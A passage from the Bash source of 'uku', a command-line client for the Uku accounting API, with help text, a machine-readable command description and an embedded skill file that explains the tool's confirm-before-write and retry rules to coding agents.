      @bulk) out="$out --batch --resume --run-id --stop-on-error --retry-unknown --skip-existing --match-on" ;;
      *)     out="$out $t" ;;
    esac
  done
  printf '%s' "$out"
}

# _surface_split TEXT — the ` :: `-separated entries of one column, one per line.
_surface_split() {
  local s="$1" item
  while [ -n "$s" ]; do
    case "$s" in
      *" :: "*) item="${s%%" :: "*}"; s="${s#*" :: "}" ;;
      *)        item="$s"; s="" ;;
    esac
    item="$(_trim "$item")"
    [ -n "$item" ] && printf '%s\n' "$item"
  done
  return 0
}

# _surface_emit — the table as facts. One fact per line, deliberately flat:
#   cmd NAME · cmdalias NAME ALIAS · sub NAME SUB · subalias NAME ALIAS
#   flag NAME --f · gflag --f · doc NAME TOKEN · arg NAME TEXT · note NAME TEXT
_surface_emit() {
  local name calias subs salias flags args notes t
  while IFS='|' read -r name calias subs salias flags args notes; do
    name="$(_trim "$name")"
    case "$name" in ''|'#'*) continue ;; esac
    if [ "$name" = "%global" ]; then
      for t in $(_surface_expand "$flags"); do
        case "$t" in
          '!'*) printf 'gflag %s\n' "${t#!}"; printf 'doc %s %s\n' "$name" "${t#!}" ;;
          *)    printf 'gflag %s\n' "$t" ;;
        esac
      done
      # the global row's notes are the ones an agent needs most (which output
      # flag means what), so they are facts like any other
      _surface_split "$notes" | while IFS= read -r t; do printf 'note %s %s\n' "$name" "$t"; done
    else
      printf 'cmd %s\n' "$name"
      for t in $calias; do printf 'cmdalias %s %s\n' "$name" "$t"; done
      for t in $subs; do
        case "$t" in
          '!'*) printf 'sub %s %s\n' "$name" "${t#!}"; printf 'doc %s %s\n' "$name" "${t#!}" ;;
          *)    printf 'sub %s %s\n' "$name" "$t" ;;
        esac
      done
      for t in $salias; do printf 'subalias %s %s\n' "$name" "$t"; done
      for t in $(_surface_expand "$flags"); do
        case "$t" in
          '!'*) printf 'flag %s %s\n' "$name" "${t#!}"; printf 'doc %s %s\n' "$name" "${t#!}" ;;
          *)    printf 'flag %s %s\n' "$name" "$t" ;;
        esac
      done
      _surface_split "$args"  | while IFS= read -r t; do printf 'arg %s %s\n' "$name" "$t"; done
      _surface_split "$notes" | while IFS= read -r t; do printf 'note %s %s\n' "$name" "$t"; done
    fi
  done <<EOF
$(_surface_table)
EOF
  return 0
}

# uku --dump-surface (hidden) — the committed `.surface`, byte for byte.
_dump_surface() { _surface_emit | LC_ALL=C sort -u; }

# The emitted facts, computed once. `uku --help --agent` asks for them ~120
# times (six lists for each of nineteen commands) and re-parsing the table each
# time turned a free operation into a visible pause.
UKU_SURFACE_CACHE=""
_surface_facts() {
  [ -n "$UKU_SURFACE_CACHE" ] || UKU_SURFACE_CACHE="$(_surface_emit)"
  printf '%s\n' "$UKU_SURFACE_CACHE"
  return 0
}

# _surface_field KIND NAME — the third column of every matching fact, space
# separated. `_surface_field sub clients` → "list get create patch".
_surface_field() {
  _surface_facts | awk -v k="$1" -v n="$2" '$1==k && $2==n { printf "%s ", $3 }'
  return 0
}

# _surface_rest KIND NAME — everything after the second column, one per line
# (`arg` and `note` facts are free text and hold spaces).
_surface_rest() {
  _surface_facts | awk -v k="$1" -v n="$2" '$1==k && $2==n { $1=""; $2=""; sub(/^  /, ""); print }'
  return 0
}

# ── uku --help --agent — the CLI describing itself ───────────────────
# The surface table already holds the command tree, the flags, the arguments
# and — the part an agent cannot get anywhere else — the `notes`, which are the
# gotchas ("there is NO uku time patch", "money needs an All-scope key"). This
# emits it as JSON so an agent can discover the CLI without a human pasting
# `uku --help` into its context.
_json_arr_words() { # "a b c" → ["a","b","c"]
  local first=1 w
  printf '['
  for w in $1; do [ "$first" = "1" ] || printf ','; first=0; printf '%s' "$(_json_str "$w")"; done
  printf ']'
}
_json_arr_lines() { # newline-separated → ["…","…"]
  local first=1 l
  printf '['
  while IFS= read -r l; do
    [ -n "$l" ] || continue
    [ "$first" = "1" ] || printf ','; first=0
    printf '%s' "$(_json_str "$l")"
  done <<EOF
$1
EOF
  printf ']'
}
_help_agent_cmd() { # NAME
  local n="$1"
  printf '{"command":%s' "$(_json_str "$n")"
  printf ',"aliases":%s' "$(_json_arr_words "$(_surface_field cmdalias "$n")")"
  printf ',"subcommands":%s' "$(_json_arr_words "$(_surface_field sub "$n")")"
  printf ',"subcommand_aliases":%s' "$(_json_arr_words "$(_surface_field subalias "$n")")"
  printf ',"flags":%s' "$(_json_arr_words "$(_surface_field flag "$n")")"
  printf ',"args":%s' "$(_json_arr_lines "$(_surface_rest arg "$n")")"
  printf ',"notes":%s' "$(_json_arr_lines "$(_surface_rest note "$n")")"
  printf '}'
  return 0
}
_help_agent() { # [TOPIC]
  local topic="${1:-}" c first=1
  if [ -n "$topic" ]; then
    # an alias resolves to the command it names, so `uku accounts --help
    # --agent` describes `account` rather than dying
    # heredocs, not pipes: see the note on _remedy_get — a consumer that stops
    # early (grep -q, awk exit) turns into a pipefail on the producer's write.
    local real=""
    if grep -qxF "cmd $topic" <<EOF
$(_surface_facts)
EOF
    then real="$topic"
    else real="$(awk -v a="$topic" '$1=="cmdalias" && $3==a { print $2; exit }' <<EOF
$(_surface_facts)
EOF
)"; fi
    [ -n "$real" ] || die "no such command: $topic" "$EX_USAGE" @@help.root
    _help_agent_cmd "$real"; printf '\n'
    return 0
  fi
  printf '{"cli":"uku","version":%s,"commands":[' "$(_json_str "$UKU_VERSION")"
  for c in $(_surface_facts | awk '$1=="cmd" { print $2 }' | LC_ALL=C sort -u); do
    [ "$first" = "1" ] || printf ','; first=0
    _help_agent_cmd "$c"
  done
  printf '],"global_flags":%s' "$(_json_arr_words "$(_surface_facts | awk '$1=="gflag" { printf "%s ", $2 }')")"
  printf ',"notes":%s' "$(_json_arr_lines "$(_surface_rest note '%global')")"
  printf ',"exit_codes":{"0":"ok","1":"usage","2":"auth","3":"api","4":"confirm","5":"network","6":"conflict"}}\n'
  return 0
}

# uku completions <bash|zsh> — source-able completion for the top-level commands.
cmd_completions() {
  local shell="${1:-}"
  local cmds; cmds="$(_surface_emit | awk '$1=="cmd"{printf "%s ",$2}')"
  cmds="$(_trim "$cmds")"
  case "$shell" in
    bash) printf 'complete -W "%s" uku\n' "$cmds" ;;
    # compdef form works under `eval "$(uku completions zsh)"` (needs compinit loaded)
    zsh)  printf 'compdef _uku uku 2>/dev/null; _uku(){ _arguments "1:command:(%s)"; }\ncompdef _uku uku\n' "$cmds" ;;
    *) die "usage: uku completions <bash|zsh>   (add to your rc: eval \"\$(uku completions zsh)\")" "$EX_USAGE" ;;
  esac
}

# uku help [command] — per-command card, or the global usage.
cmd_help() {
  local topic="${1:-}"
  case "$topic" in
    "") usage; return 0 ;;
    auth) cat <<EOF
$(_bold "uku auth") — sign in and inspect the active account
  uku auth login [--account NAME] [--company UUID] [--base URL] [--key-stdin]
  uku auth status [--json]        who you're acting as (validates the key)
  uku auth logout [--account NAME]
  uku auth print-header [--format curl|shell|plain]
                                  the two auth headers, for when you must drop
                                  to curl. Prints a LIVE key — treat it as one.
                                    curl -K <(uku auth print-header) https://…
                                    eval "\$(uku auth print-header --shell)"
                                  --dry-run keeps the key masked.
Non-interactive:  printf '%s' "\$KEY" | uku auth login --account ci --company <uuid> --key-stdin
EOF
    ;;
    account|accounts) cat <<EOF
$(_bold "uku account") — one login, many companies (keep a sandbox beside your main firm)
  uku account list                 ● marks the active account
  uku account use <name>           switch the active account
  uku account current              print the active account
  uku account add <name> …         = uku auth login --account <name>
  uku account remove <name>
  uku --account <name> <command>   run one command against a specific account
EOF
    ;;
    clients|tasks|time|invoices|members|products|contracts|projects)
      # Generated from the surface table, so a card can never claim a
      # subcommand the dispatcher does not have (or hide one it does).
      local subs; subs=" $(_surface_field sub "$topic")"
      printf '%s — %s\n' "$(_bold "uku $topic")" "$(printf '%s' "$subs" | tr -s ' ' | sed 's/^ //;s/ $//;s/ /\//g')"
      printf '  uku %s list [--q X] [--status S] [--limit N] [--offset N] [--all] [--json]\n' "$topic"
      if [ -n "$(_name_field "$topic")" ]; then
        printf '  uku %s get <id>          also takes a name, or a URL you pasted — see: uku help names\n' "$topic"
      else
        printf '  uku %s get <id>          also takes a URL you pasted (no name field here) — see: uku help names\n' "$topic"
      fi
      case "$subs" in *" create "*)
        printf '  uku %s create --data @file.json --yes\n' "$topic"
        printf '  uku %s create --batch @file.jsonl --yes      many at once — see: uku help batch\n' "$topic" ;;
      esac
      case "$subs" in *" patch "*)
        printf '  uku %s patch <id> --data @file.json --yes\n' "$topic" ;;
      esac
      case "$subs" in *" create "*|*" patch "*) : ;; *)
        printf '  %s\n' "$(_dim "read-only here. What the API itself allows: uku api --describe $topic")" ;;
      esac
      printf 'Notes:\n'
      _surface_rest note "$topic" | sed 's/^/  · /'
      printf 'Examples:\n  uku %s list --limit 5\n  uku %s list --json | jq %s\n' \
        "$topic" "$topic" "'.data[] | {id}'"
    ;;
    batch) cat <<EOF
$(_bold "uku batch") — create many records from one file, safely restartable

  uku tasks create   --batch @tasks.jsonl --yes
  uku clients create --batch @clients.jsonl --yes
  uku time create    --batch @time.jsonl --yes
  uku api POST /api/v3/tasks --batch @tasks.jsonl --yes
  cat tasks.jsonl | uku tasks create --batch @- --yes

$(_bold "INPUT")  one JSON object per line. Blank lines and lines starting with #
  are skipped; a final line without a newline is fine. A malformed line fails
  by itself — it never aborts the run.

$(_bold "OUTPUT")  one JSON result per input line on stdout (line, outcome,
  id, status, code, message) — pipe it, grep it. Everything human is on stderr.
    uku tasks create --batch @t.jsonl --yes | jq -r 'select(.outcome=="failed")'

$(_bold "THE LEDGER — why --resume can be trusted")
  Each created line is recorded as a HASH of its content plus the id the server
  returned, appended to $UKU_CONFIG_HOME/batches/<run-id> the moment
  the create is confirmed. Kill the run at any point and the ledger is complete
  up to the last record that actually landed. Re-run with --resume and those
  exact lines are skipped — no duplicates, no server-side matching, no guessing.
  The run-id is derived from the target plus a hash of the file, so --resume
  works without having remembered anything. --run-id NAME overrides it.

  The rule is about what the server was OBSERVED to do, not about which lines
  went out:
    • created (the server confirmed it)  → --resume SKIPS it.
    • the server answered and refused it (422, 500, 412, …) → nothing was
      created, so --resume $(_bold "re-sends it"). That is what the
      "→ run:" line under the summary is for.
    • sent, and the reply never came — the one line an interruption can catch
      in flight → $(_bold "UNKNOWN"). --resume $(_bold "refuses to re-send it") and tells you
      so: the CLI cannot know whether it landed, and guessing would duplicate a
      record. Check that one, then --retry-unknown to send it.
  The ledger stores a hash, never the line: no client data is written to disk.
    uku batch list · uku batch show <run-id>

$(_bold "--skip-existing --match-on FIELD — read this before using it")
  It queries the API for a record whose FIELD equals this line's value, and
  skips the line if it finds exactly one. $(_bold "It is fragile.") In an accounting
  firm dozens of records legitimately share a title — every client has a
  "Käibedeklaratsioon" — so a title match can easily be the wrong record.
  When more than one record matches, the CLI $(_bold "refuses that line") (AMBIGUOUS_MATCH)
  and records why, rather than silently picking one.
  $(_bold "The ledger, not --match-on, is the trustworthy path to idempotency.")
  Use --match-on only against a field that is genuinely unique in your firm,
  and only for records this CLI did not create.

$(_bold "WRITES, RATE LIMITS, FAILURES")
  --yes confirms the whole batch ONCE (line count + target + account), not once
  per line. Without a TTY and without --yes the batch is refused (exit 4).
  A failed line is recorded and the run CONTINUES; --stop-on-error halts instead.
  A 412 fails that line and is never auto-retried. The write budget is small
  (30/min), so the run paces itself through the same limiter as every other
  write; if the wait would exceed UKU_RL_MAX_WAIT (${UKU_RL_MAX_WAIT}s) it stops
  cleanly, tells you when the window resets, and leaves a resumable ledger.
  --dry-run validates every line, reports what WOULD happen (including which
  lines the ledger would skip) and sends no write. (With --skip-existing it
  still runs the read-only match query — otherwise it could not tell you which
  lines that would skip.)
  Exit: 0 all good · 3 some line failed · 5 stopped on the rate limit · 4 refused.
EOF
    ;;
    names) cat <<EOF
$(_bold "uku … <name>") — naming a record without knowing its id

  uku clients get "Acme Ltd"            a name instead of an id
  uku clients get 41                    an id passes straight through — no lookup
  uku clients get '$UKU_BASE_DEFAULT/…/41'
                                        a URL you pasted from the browser (the
                                        CLI reads the last id in it — whatever
                                        the page's route happens to be)
  uku tasks list --client "Acme"        the same, as a filter
  uku search "acme"                     when you are not sure what you are after

$(_bold "HOW A NAME IS RESOLVED")  (one request, on the endpoint the command already names)
  The CLI sends the same \`--q\` a list takes, then matches what came back:
  exact first (case-insensitive for ASCII), then a unique substring.
    • exactly one match  → it is used, and the record + its id are printed on
      stderr before anything else happens. You always see what was chosen.
    • several matches    → $(_bold "refused"), with the candidates and their ids.
      In a firm dozens of records legitimately share a name; picking one would
      be picking wrong, and this CLI writes invoices.
    • no match           → refused, with whatever the query did bring back.
    • more records exist than the lookup could see → $(_bold "refused"). It reads at
      most 100 and compares that against the \`meta.total\` the API reports; one
      row out of a stated 4000 is not a unique match, it is the first page.
  A name is trimmed before anything looks at it, an empty or whitespace-only
  reference is refused, and one longer than $UKU_REF_MAX characters is refused as a
  mistake rather than encoded into a query string.
  Resolving needs jq (it compares a field exactly). Without jq it refuses
  rather than guess — pass an id.

$(_bold "WHEN AN ARGUMENT IS BOTH")  --by-id · --by-name
  \`12345678\`, \`CAFE-1\` and \`DECADE\` are id-shaped AND perfectly good names —
  a Nordic registry code is how a firm names a client every day. So:
    • $(_bold "on a read") an id-shaped argument is taken as an id, with no request at
      all. If it was really a name the worst case is a 404 and you try again.
    • $(_bold "on a write") it is ALSO looked up as a name (one extra GET, after the
      \`--yes\` confirm, so a refused write still sends nothing). If a record's
      name is that exact string, the write is $(_bold "refused") — both readings are
      real and guessing between them is how the wrong ledger gets written.
  Say which you meant and it proceeds:
    uku clients patch 12345678 --by-id   --data @f.json --yes
    uku clients patch 12345678 --by-name --data @f.json --yes
  Without jq the check cannot be made, so the write is refused until --by-id.

$(_bold "WHICH RESOURCES")  clients (name) · tasks (title) · members, products,
  projects (name). An invoice, a contract and a time entry have no name field,
  so there they take an id or a URL — never a name.

$(_bold "A URL YOU PASTED")
  The host must match the base URL this account uses ($UKU_BASE_DEFAULT by
  default); a link from anywhere else is refused and nothing is sent. The id is
  the last id-shaped segment — the command already names the resource, so no
  knowledge of the web app's routes is involved.

$(_bold "WHAT NEVER RESOLVES")  an argument that already looks like an id on a
  READ (no request at all) · a write body · any line of a --batch. A batch line
  carries its own fields; guessing an id into one would be inventing data.
EOF
    ;;
    search) cat <<EOF
$(_bold "uku search") — one query, fanned out over the list endpoints

  uku search "acme"
  uku search "acme" --limit 3
  uku search "acme" --json | jq '.resources[] | select(.count > 0)'

$(_bold "WHAT THIS IS, EXACTLY")
  Not a server-side global search: the Uku API v3 offers none that this CLI can
  verify, and inventing an endpoint is how a tool starts lying. This is the
  loop you would otherwise type — the SAME \`--q\` that \`uku <res> list --q\`
  sends, run once against each list endpoint that has a name field:
    clients · tasks · members · products · projects
  One request per resource. No server-side join, no ranking across resources.
  --limit is per endpoint (default 10).

$(_bold "A FAILING ENDPOINT IS REPORTED, NEVER SWALLOWED")
  If one of them errors it is listed as FAILED — not as zero results. "No such
  client" when nobody actually looked is the most dangerous thing a search can
  say. Exit 3 when any endpoint failed; 0 when all of them answered.
EOF
    ;;
    api) cat <<EOF
$(_bold "uku api") — reach any endpoint in the API v3
  uku api <GET|POST|PATCH|DELETE> </api/v3/...> [--data @f|@-] [--query k=v] [--yes]
  uku api --describe               the resource map
Writes are deliberate (need --yes or a TTY). Example:
  echo '{"client_id":211310}' | uku api POST /api/v3/invoices --data @- --yes
EOF
    ;;
    setup) cat <<EOF
$(_bold "uku setup agents") — teach your coding agents the uku contract, once
  Installs a skill for Claude Code (~/.claude/skills/uku), Cursor (.cursor/rules),
  and a block in ./AGENTS.md. UKU_SETUP_AGENT=claude|cursor|codex|all|none.
EOF
    ;;
    *) die "No help for '$topic'." "$EX_USAGE" @@help.root ;;
  esac
}

# First-run wizard — bare `uku` with a TTY and no credentials. Turns the empty
# state into: welcome → sign in → run the first command for them.
first_run() {
  load_creds
  if [ -n "${UKU_KEY:-}" ]; then
    # already signed in → short status + the top commands
    cmd_auth status || true
    printf '\n  %s\n  %s\n' "$(_dim 'Try:')" "$(_bold 'uku clients list') · $(_bold 'uku tasks list') · $(_bold 'uku --help')" >&2
    return 0
  fi
  if ! _is_tty; then usage; exit "$EX_USAGE"; fi   # scripts get usage + a nonzero code
  printf '\n  %s\n  %s\n\n' "$(_bold 'uku') — operate your firm'\''s Uku from the terminal." "$(_dim 'Agents welcome. Reads are free · writes ask first · money has its own key.')" >&2
  printf '  Your API key lives in Uku → Settings → API (scoped Read / Edit / All).\n\n' >&2
  printf '  Sign in now? [Y/n] ' >&2; local r; read -r r < /dev/tty || true
  case "$r" in n|N|no|NO) printf '\n  When ready: %s\n' "$(_bold 'uku auth login')  ·  $(_bold 'uku setup agents')" >&2; return 0 ;; esac
  cmd_auth login
  printf '\n  %s\n' "$(_dim 'Here'\''s your firm:')" >&2
  cmd_clients list --limit 5 || true
  printf '\n  %s %s\n' "$(_green '✓')" "$(_dim 'That'\''s your data. Try:') $(_bold 'uku tasks list') · $(_bold 'uku setup agents')" >&2
}

# ── setup: connect coding agents (the agent-native handshake) ────────
# Writes a skill/rule file that teaches an agent the uku contract ONCE, so
# every future session knows the tool — and, above all, the safety model.
_uku_skill_md() {
cat <<'SKILL' | sed "s/@@VER@@/$UKU_VERSION/g"
---
name: uku
description: Operate a firm's Uku (accounting practice management) from the terminal with the `uku` CLI — read clients, tasks, time entries and invoices, and make scoped writes. Use whenever the user asks to look up, list, count, log, draft, send or update anything in their Uku account.
---
<!-- uku-skill v@@VER@@ -->

# uku — operate Uku from the terminal

`uku` is a command-line client over the Uku API v3. Prefer it for any Uku data task; it is faster and safer than raw HTTP.

## The safety contract — read this first
- **Reads are free.** `uku clients list`, `uku tasks list`, `uku invoices list`, `uku <res> get <id>`.
- **Writes ask first.** A write needs `--yes` (or an interactive confirm). Before you add `--yes`, state in plain words exactly what you are about to change, and prefer to let the human confirm.
- **Money has its own key.** Financial actions need an *All*-scope key. A `HTTP 403 … scope` error is the system working as designed — surface it to the user, do **not** retry or try to work around it.
- **Accounts.** A user may have several: a real firm and a **sandbox**. Run `uku account current` before any write, and confirm you are on the intended account. `--account <name>` targets one command.

## Output & exit codes (this is your API)
- `--json` is the default when output is not a TTY — you already receive JSON. Lists wrap as `{ "data": [ … ], "meta": { "total", "limit", "offset", "has_more", "next_cursor" } }`; a single get wraps as `{ "data": { … } }`. Parse `.data`.
- Exit codes: **0** ok · **1** usage · **2** auth (tell the user to run `uku auth login`) · **3** API error · **4** a write was refused because `--yes` was missing · **5** network / rate limited · **6** conflict: someone else changed the record (HTTP 412).

### `--agent` — ask for the envelope
`--json` is the raw API body and never changes. `--agent` is the channel built for you; the two are alternatives, and passing both is a usage error.

```
uku clients list --limit 2 --agent
{"ok":true,"data":[{"id":41,…}],"meta":{"total":2,…},
 "summary":"2 clients",
 "breadcrumbs":[{"cmd":"uku clients get 41","why":"that client in full"}]}
```
- `data` and `meta` are the API's own values, spliced out of its body — the same values `--json` gives you. The one exception is `--fields`, which projects each row to the keys you named and re-serialises it through jq; ask for `--fields` and you are asking for a reshaped `.data`.
- On failure: `{"ok":false,"error":"…","code":"auth","hint":"uku auth login"}` — and **the exit code is unchanged**. `code` is the stable name of the exit status (`usage` `auth` `api` `confirm` `network` `conflict`), so branch on either.
- `breadcrumbs` are the commands most plausibly next, with real ids already filled in. They are checked against the CLI's own command surface at build time, so a breadcrumb never names a command that does not exist. That is all it proves: a breadcrumb may still be a WRITE (`uku clients get 41` suggests `uku clients patch 41`), and a write always needs the same treatment as any other — state what it would change and let the human confirm before you add `--yes`. Read the command before you run it. `--no-hints` or `--quiet` empties the array.
- A `--batch` run keeps its JSONL-per-line output under `--agent`: that stream is already the machine contract, and one envelope could not describe N independent outcomes. So there is **no `{"ok":…}` envelope at all** for a batch — including on failure, where the run exits **3** and the per-line objects are the only report. Parse the lines, not an envelope.

### `uku --help --agent` — discover the CLI instead of guessing
```
uku --help --agent          # the whole tree: commands, flags, args, notes, exit codes
uku time --help --agent     # one command
```
The `notes` are the gotchas — above all the negative kind (which subcommand does *not* exist, which flag belongs elsewhere). Read them before inventing a command; it costs one cheap local call and no network.

## Commands
- `uku auth status [--json]` — who/which account you're acting as.
- `uku account list | current | use <name>` — accounts.
- `uku clients list [--q X] [--status S] [--limit N]` · `uku clients get <id>`
- `uku tasks list` · `uku time list` · `uku invoices list [--status draft]` · `uku invoices get <id>`
- `uku invoices create --data @file.json --yes` — a deliberate write.
- **Invoices have no `patch`, no `send` and no `mark-paid` subcommand.** The API has all three; reach them through `uku api`, and do not invent a subcommand for a money action:
  `uku api PATCH /api/v3/invoices/<id> --data @f.json --yes` · `uku api POST /api/v3/invoices/<id>/send --yes` · `uku api POST /api/v3/invoices/<id>/mark-paid --yes`
- `uku search <query>` — one `--q` fanned out over the list endpoints that have a name field. See below; it is **not** a global search endpoint.
- `uku api <GET|POST|PATCH|DELETE> </api/v3/...> [--data @f|@-] [--query k=v] [--yes]` — every one of the 80+ v3 endpoints. Use this for anything without a first-class command.
- Singular aliases work everywhere: `uku client get 41` = `uku clients get 41` (also `task`, `invoice`, `member`, `product`, `project`, `contract`).
- Global: `--header 'K: V'` (repeatable) · `--if-match '<etag>'` · `--dry-run` (prints the request, sends nothing — a name/id lookup still runs, so the request you are shown is the write itself, with the resolved id in the path) · `--agent` (the envelope above) · `--no-hints` · `--by-id` / `--by-name` (see below).
- `uku auth print-header` — the raw auth headers, for the rare case `uku api` can't express something. It prints a **live credential**: never echo it back to the user, never put it in a file you commit, and prefer `uku api`.

## Naming a record you have no id for

The user will give you a **name** or paste a **URL**, not an id. Both work as the
argument, and both are safe because neither ever guesses:

```
uku clients get "Acme Ltd"            # resolved by name
uku clients get 41                    # an id — passes through, no lookup request
uku clients get 'https://<same host as the account>/…/41'
uku tasks list --client "Acme Ltd"    # resolves once, then filters by client_id
```

- **How a name resolves:** the CLI sends the same `--q` a list takes, on the endpoint the command already names, then matches exact (ASCII case-insensitive) then unique substring. **Exactly one match** is used and the chosen record + id are printed on stderr. **Several matches → refused** (exit 1) with the candidates listed: pick one and re-run with its id — do not retry the same name, and never pick one yourself by re-running with a longer guess unless the user confirms it. **No match → refused.** **More records than the lookup could see → refused**: it reads at most 100 and compares that against `meta.total`, so one row out of a stated 4000 is the first page, not a unique match — narrow the name or pass the id. Resolving needs `jq`. An empty or whitespace-only argument, and one over 200 characters, are refused before anything is sent.
- **Which resources have a name to match:** clients (`name`), tasks (`title`), members, products, projects (`name`). An invoice, a contract and a time entry have **no** name field — there, only an id or a URL works.
- **A URL** must be on the same host as the account's base URL; anything else is refused and nothing is sent. The id taken is the last id-shaped segment.
- **Never resolved by name:** a write body, or any line of a `--batch`. `--client` on a write or a batch is a usage error.
- **`--by-id` / `--by-name` — when the argument is both.** `12345678`, `CAFE-1` and `DECADE` are id-shaped *and* perfectly good names; a registry code is how a firm names a client every day. On a **read**, an id-shaped argument is taken as an id with no request at all. On a **write** it is *also* looked up as a name (one extra GET, after the `--yes` confirm, so a refused write still sends nothing); if a record's name is that exact string the write is **refused** (exit 1) rather than aimed at a guess. Do not pick for the user: pass `--by-id` (treat it as an id) or `--by-name` (resolve it as a name) only once you know which they meant, and say which you used.
- **`--client` verifies itself.** After the response comes back the CLI compares `client_id` on every returned row against the one asked for. A mismatch means the endpoint ignored the filter, and the command fails with **exit 3**. What that proves is narrow and worth being exact about: the API honoured `client_id` **for the id it was sent**. It cannot prove that id is the client the user named — that is the job of the resolution line printed on stderr (`→ client 41 — Acme Ltd`), which you should read back to the user. Do not work around the exit 3 by re-running without `--client` and presenting the rows as the client's; they are not.

## `uku search <query>` — what it is and is not

It is **not** a server-side global search; the API offers none. It is one `--q` run
against each list endpoint that has a name field (clients, tasks, members, products,
projects) — one request each. `--limit` is per endpoint.

Output is `{query, kind:"fanout", resources:[{resource, path, ok, status, error, count, data}]}`.
**An endpoint that errored has `ok:false` and `count:null` — that is "nobody looked",
not "nothing found". Never report it to the user as zero results.** Exit 3 if any
endpoint failed.

## Building a write payload
You must supply the body; the CLI does not invent fields. Discover the shape from
`uku api --describe` (resource map + the common required fields) and the OpenAPI
spec at `https://app.getuku.com/api/v3/openapi.json`. Common required fields:
- **task**: `title` (min). Others: `client_id`, `status`, `date`, `due_date`, `is_important`.
- **time entry**: `task_id`, `person_id`, `start` (+ `end`/`duration`, `billable`).
- **invoice**: `client_id` (+ `seller_id`, `invoice_date`, `due_date`, `currency`).
- **client**: `name`.
If unsure of a field, read the spec first — a wrong field fails server-side.

## Retry doctrine (the important part)

Read the status, not the vibe. Each of these means something different:

| Status | What happened | What you do |
|---|---|---|
| **428** PRECONDITION_REQUIRED | The server refused the write for want of an `If-Match`. **Nothing happened.** | Safe to re-send once with the ETag. **The CLI does this for you when the path names a record** (`PATCH /contracts/{id}`, `POST /contracts/{id}/rows`, `DELETE …/{id}`), automatically and only once. On a **collection POST** (`POST /api/v3/tasks`) there is no record to read an ETag from, so it is not healed: GET the relevant resource and pass `--if-match '<etag>'` yourself. If a heal still fails, do the same. |
| **412** STALE_WRITE (exit **6**) | Someone else changed the record after you read it. **Nothing was written.** | **STOP.** Re-read the record, re-apply your change on top of the *current* values, then write again. **Never** retry automatically — a blind retry silently overwrites their edit. Tell the user what changed. |
| **429** rate limited (exit **5**) | Outcome **unknown** for a write. | **Never auto-retry a write.** GET to check whether it landed. The message tells you how many seconds until the window resets — wait, don't poll. Reads are safe and the CLI already waits once for you. |
| **5xx / timeout** (exit 3/5) | On a **write**, outcome **unknown**. On a **read**, nothing was written. | Write: same as 429 — GET first, never blind-resend. Read: nothing happened, so re-running the same read once the server recovers is safe. The CLI's own remedy line now says which case you are in. |
| **409** domain conflict | The action isn't allowed right now (`*_LOCKED`, `*_EXISTS`, `TIMER_ALREADY_RUNNING`). | Re-sending the identical request fails identically. Change the request or tell the user. |

**Reads are idempotent; the CLI re-issues one at most once, and only when the connection itself failed — an HTTP status is never re-sent for you. A write is re-sent automatically in exactly one case — a 428 on a path that names a record, where the server refused it and nothing happened. You must never resend any other failed write yourself: outside a 428 the outcome is unknown, so GET first.**

### Creating many records — use `--batch`, never a shell loop
When the user wants N records created, write one JSON object per line to a
`.jsonl` file and run the batch. Do **not** write your own `for` loop: the CLI
already handles pacing, the confirm, and — the important part — a ledger that
makes the run restartable.

```
uku tasks create --batch @tasks.jsonl --yes          # one confirm for the file
uku tasks create --batch @tasks.jsonl --resume --yes # after any interruption
```
- stdout is **JSONL, one result per input line**: `{line, outcome, id, status, code, message}`. `outcome` is `created` / `skipped` / `failed` (`would_create` / `would_skip` under `--dry-run`).
- A bad line fails by itself; the run continues. `--stop-on-error` halts instead.
- **`--resume` is safe and is the correct response to any interrupted or partly-failed batch.** What the ledger records is what the server was *observed* to do:
  - **created** → skipped by content hash; re-running cannot duplicate it.
  - **answered and refused** (422 / 500 / 412 …) → nothing was created, so `--resume` **re-sends** that line.
  - **sent, no reply** (the one line an interruption can catch in flight) → **UNKNOWN**: `--resume` refuses it and says so. Check the server, then `--retry-unknown` if it really is missing.
- `--dry-run` validates every line and sends nothing.
- `--skip-existing --match-on <field>` queries before creating. It is fragile — many real records share a title — and it refuses a line when more than one record matches. Prefer the ledger; use `--match-on` only on a genuinely unique field.
- `uku batch list` · `uku batch show <run-id>` — what a previous run did.

### Version checks (If-Match / ETag)
Financial writes (invoices, contracts and their rows, agreements, members,
monitors) are guarded so two people can't overwrite each other. Usually you do
not have to manage this: omit `--if-match` and, **when the path names a record**,
the CLI fetches that record's ETag on a 428 and re-sends once — walking up to
the parent when the path's own segment is not an id (`POST /contracts/{id}/rows`
uses `GET /contracts/{id}`).

**The exception is a collection POST**, e.g. `POST /api/v3/tasks`: there is no id
in the path, so there is no resource to read an ETag from and the 428 is
reported as an API error (exit 3). Then GET the resource the server is guarding
and pass `--if-match '<etag>'` yourself.

Pass `--if-match '<etag>'` deliberately whenever you already hold a version you
want to assert — a 428 is then **not** healed, because the value you chose was
the thing rejected.

### Time entries — the one payload shape to avoid
A time entry with a `start` and **no `end`** is a *running timer*, not logged
work. Sending `duration` without `end` is the single most common failure
(`409 TIMER_ALREADY_RUNNING`); the CLI now refuses it before sending. To log
finished work send `start` **and** `end`. Send `start` alone only when you
really mean to start a timer.

- Exit **2** = re-auth (`uku auth login`). Exit **4** = you forgot `--yes`. Exit **6** = 412, see above.
- Keep requests lean: use `--limit` small and `get <id>` over listing when you
  know the id. `--all` can be large — avoid it unless the user needs everything.
- **Never print or log the API key.** `uku auth status` masks it for you.

## Examples
```
uku clients list --q "acme" --limit 5
uku tasks list --status open --json | jq '.data[] | {id, title}'
uku api GET /api/v3/time-entries --query client_id=211310 --json
# a write — describe it, confirm the account, then confirm the write:
uku account current
echo '{"title":"Prepare Q1 filing","client_id":211310}' | uku api POST /api/v3/tasks --data @- --yes
```

Docs: https://app.getuku.com/api/v3/docs · https://app.getuku.com/api/v3/openapi.json
SKILL
}

_detect_agent() { # prints: claude / cursor / codex if detectable, else nothing
  { [ -d "$HOME/.claude" ] || have claude; } && printf 'claude\n' || true
  { [ -d ".cursor" ] || have cursor; } && printf 'cursor\n' || true
  { [ -f "AGENTS.md" ] || have codex; } && printf 'codex\n' || true
  return 0
}

_setup_claude() {
  local dir="$HOME/.claude/skills/uku" f
  mkdir -p "$dir" || { warn "Could not create $dir"; return 1; }
  f="$dir/SKILL.md"
  local ver="uku-skill v$UKU_VERSION"
  if [ -f "$f" ] && grep -qF "$ver" "$f" 2>/dev/null; then
    info "Claude Code — skill already current ($ver)"; return 0
  fi
  _uku_skill_md > "$f"
  info "Claude Code — skill installed ($f)"
}
_setup_cursor() {
  mkdir -p ".cursor/rules" 2>/dev/null || { warn "No writable .cursor/rules here (run in your project)"; return 1; }
